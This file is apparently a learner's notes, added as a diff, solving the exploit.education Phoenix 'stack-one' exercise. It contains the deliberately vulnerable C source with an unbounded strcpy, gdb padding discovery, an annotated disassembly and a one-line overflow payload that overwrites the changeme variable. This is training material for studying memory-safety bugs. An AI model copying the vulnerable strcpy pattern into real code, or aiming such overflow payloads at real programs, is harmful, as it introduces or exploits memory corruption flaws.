@@ -1,0 +1,138 @@
+/*
+ * phoenix/stack-one, by https://exploit.education
+ *
+ * The aim is to change the contents of the changeme variable to 0x496c5962
+ *
+ * Did you hear about the kid napping at the local school?
+ * It's okay, they woke up.
+ *
+ */
+
+// Undertanding volatile:
+https://www.youtube.com/watch?v=o3dcmo-hbQw
+
+// We find the padding
+// Run the program in gbb:
+// r aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+// then we print the value 
+// x $rbp-0x10
+    0x71717171
+
+0x71 = 113 = q
+
+// padding = 
+// aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopppp
+// lets test it:
+// aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppaaaa
+// works, we want to have:
+0x496c5962
+
+0x49 0x6c 0x59 0x62
+I    l    Y    b
+
+intel is litle endian
+endianess:
+(asscending addresses):
+a
+a
+a
+a
+b
+b
+b
+b
+...
+0x62 = b
+0x59 = Y
+0x6c = l
+0x49 = I
+
+// solution:
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppbYlI
+
+python -c "print('a'*64 + 'bYlI')" | xargs ./stack-one
+
+// aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppslYb
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int changeme;
+  } locals;
+
+  printf("%s\n", BANNER);
+
+  if (argc < 2) {
+    errx(1, "specify an argument, to be copied into the \"buffer\"");
+  }
+
+  locals.changeme = 0;
+  strcpy(locals.buffer, argv[1]);
+
+  if (locals.changeme == 0x496c5962) {
+    puts("Well done, you have successfully set changeme to the correct value");
+  } else {
+    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
+        locals.changeme);
+  }
+
+  exit(0);
+}
+
+0x000000000040066d <+0>:	push   rbp // push current base pointer to the stack, effectively saving it
+0x000000000040066e <+1>:	mov    rbp,rsp // set the basepointer to the current stack
+0x0000000000400671 <+4>:	sub    rsp,0x60 // reserve some memory
+
+0x0000000000400675 <+8>:	mov    DWORD PTR [rbp-0x54],edi
+0x0000000000400678 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
+0x000000000040067c <+15>:	mov    edi,0x400750
+0x0000000000400681 <+20>:	call   0x4004c0 <puts@plt> // print welcome message
+// if nargs < 2 {
+0x0000000000400686 <+25>:	cmp    DWORD PTR [rbp-0x54],0x1
+0x000000000040068a <+29>:	jg     0x4006a0 <main+51>
+    0x000000000040068c <+31>:	mov    esi,0x4007a0
+    0x0000000000400691 <+36>:	mov    edi,0x1
+    0x0000000000400696 <+41>:	mov    eax,0x0
+    0x000000000040069b <+46>:	call   0x4004d0 <errx@plt> // error message
+// }
+
+0x00000000004006a0 <+51>:	mov    DWORD PTR [rbp-0x10],0x0 // set the changeme variable to 0
+
+0x00000000004006a7 <+58>:	mov    rax,QWORD PTR [rbp-0x60] 
+0x00000000004006ab <+62>:	add    rax,0x8
+0x00000000004006af <+66>:	mov    rdx,QWORD PTR [rax] // location of the argv
+0x00000000004006b2 <+69>:	lea    rax,[rbp-0x50] // destination char buffer
+0x00000000004006b6 <+73>:	mov    rsi,rdx
+0x00000000004006b9 <+76>:	mov    rdi,rax
+0x00000000004006bc <+79>:	call   0x4004a0 <strcpy@plt> // copy argv to char buffer
+
+// if changeme == 0x496c5962 {
+0x00000000004006c1 <+84>:	mov    eax,DWORD PTR [rbp-0x10]
+0x00000000004006c4 <+87>:	cmp    eax,0x496c5962
+0x00000000004006c9 <+92>:	jne    0x4006d7 <main+106>
+
+    0x00000000004006cb <+94>:	mov    edi,0x4007d8
+    0x00000000004006d0 <+99>:	call   0x4004c0 <puts@plt>
+    0x00000000004006d5 <+104>:	jmp    0x4006eb <main+126> // print success message
+// } else {
+    0x00000000004006d7 <+106>:	mov    eax,DWORD PTR [rbp-0x10]
+    0x00000000004006da <+109>:	mov    esi,eax
+    0x00000000004006dc <+111>:	mov    edi,0x400820
+    0x00000000004006e1 <+116>:	mov    eax,0x0
+    0x00000000004006e6 <+121>:	call   0x4004b0 <printf@plt> // print failed message
+// }
+
+// exit
+0x00000000004006eb <+126>:	mov    edi,0x0
+0x00000000004006f0 <+131>:	call   0x4004e0 <exit@plt>
+
+
